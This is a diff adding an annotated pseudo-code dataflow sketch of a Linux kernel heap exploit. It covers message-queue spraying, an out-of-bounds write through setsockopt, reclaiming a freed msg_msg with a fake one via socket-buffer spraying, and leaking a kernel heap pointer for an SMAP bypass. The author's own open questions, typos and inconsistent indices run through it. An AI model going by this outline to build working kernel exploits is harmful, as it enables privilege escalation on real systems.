@@ -1,0 +1,88 @@
+[data1] int s;
+ [data2] int fd;
+ [data3] int ss[NUM_SOCKETS][2];
+ [data4] int pipefd[NUM_PIPEFDS][2];
+ [data5] int msqid[NUM_MSQIDS];
+
+ char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];
+ [data6] char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];
+
+ [data7] struct msg_msg *msg;
+ [data8] struct pipe_buf_operations *ops;
+ [data9] struct pipe_buffer *buf;
+
+ uint64_t pipe_buffer_ops = 0;
+ [data10] uint64_t kheap_addr = 0
+ int fake_idx = -1, real_idx = -1;
+ 
+ [data11] struct msg_primary;
+ [data12] struct msg_secondary;
+ [data13] struct msg_fake;
+
+ [data14] struct data;
+ [data15] uint64_t kbase_addr = 0;
+
+====================================================
+[flow] data3.0 * conts —socketpair—> data3.1,…,data3.4
+[flow] data5.0 * conts  —msgget—> data5.1,…,data5.4096
+
+⇒ Stage 1 – Memory Corruption
+[flow] data11.0 * “0” —memset—> data11.1.1,…,data11.1.4096
+   *(int *)&msg_primary.mtext[0] = conts;
+   *(int *)&msg_primary.mtext[4] = 1,…,4096;
+
+### receive message from message queue ####
+[flow] data5.1,…,data5.4096 * &data11.1 —write_msg—> data11.2.1,…,data11.2.4096
+
+[flow] data12.0 * conts  —memset—> data12.1.1,…,data1.12.4096
+   *(int *)&msg_secondary.mtext[0] = conts;
+   *(int *)&msg_secondary.mtext[4] = 1,…,4096;
+
+########## receive message from message queue ############
+[flow] data5.1,…,data5.4096 * &data12.1 —write_msg—> data12.2.1,…,data12.2.4096
+
+########### creating holes in the primary message #############
+[flow] data5.1,…,data5.4096 * &data11.2 —read_msg—>  &data11.3 {data11.3.1024, data11.3.2048 ,data11.3.3072}
+
+### trigger the out of bond write ###
+*** Not sure which of these makes more sense – when a function calls a function? ***
+[flow] data1.0  —trigger_oob_write—> data1.1
+	##### Partially overwrite the adjacent buffer with 2 bytes of zero ######
+	[flow] data1.0  —trigger_oob_write —> data1.0  * data14.0 * conts  —>setsockopt—> data1.1
+
+
+### Searching for corrupted primary message ###
+[flow] data5.1,…,data5.4096 * &data12.2 —peak_msg—> data12.3.1,…,data12.3.4096
+### fake_idx's primary message has a corrupted next pointer; wrongly 
+ 	### pointing to real_idx's secondary message. ##########
+fake_idx = i;
+    	real_idx = *(int *)&msg_secondary.mtext[4];
+
+
+⇒Stage 2 - carry out the SMAP bypas
+### Freeing real secondary message ###
+[flow] data5.1{real_idx} * &data12.3 —read_msg—> &data12.4
+
+######### Reclaim the previously freed secondary message with a fake msg_msg of #######
+######### maximum possible size.
+
+[flow] data6.0 * ‘0’ —memset—> data6.1
+[flow] data6.1 * conts —build_msg_msg—> data6.2
+[flow] data3.0 * data6.2’ —spray_skbuff—> data3.1
+
+######### use fake secondary message to read out-of-bonds… #########
+######### Leaking adjacent secondary message ##################
+[flow] data5.1{fake_idx} * &data13.0 —peak_msg—> &data13.1
+
+
+######### the secondary message contains a pointer to the primary message ##########
+*** how do we carry out simple assignments e.g A = B + 5 ? ***
+
+[flow] data7.0 —assingment to  &data13.1{conts index}—>data7.1
+
+[flow] data10.0 —assingment to  data7.1->m_list_next—>data10.1
+
+####### freeing fake secondary message ###########
+[flow] data3.1 * data6.2 —free_skbuff—> data6.3
+
+======================
